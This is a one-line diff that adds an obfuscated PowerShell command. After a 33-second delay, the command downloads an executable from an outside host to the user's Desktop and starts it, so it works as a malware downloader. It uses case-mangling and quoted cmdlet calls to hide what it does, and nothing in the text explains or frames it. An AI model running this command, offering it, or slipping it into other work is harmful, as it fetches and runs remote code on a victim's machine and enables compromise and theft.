@@ -1,0 +1,1 @@
+$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLOaDFiLE.iNVoKE('https://fucloacking.ml/ecita','$Des\1656702.exe');&'Start-Process' $Des\1656702.exe
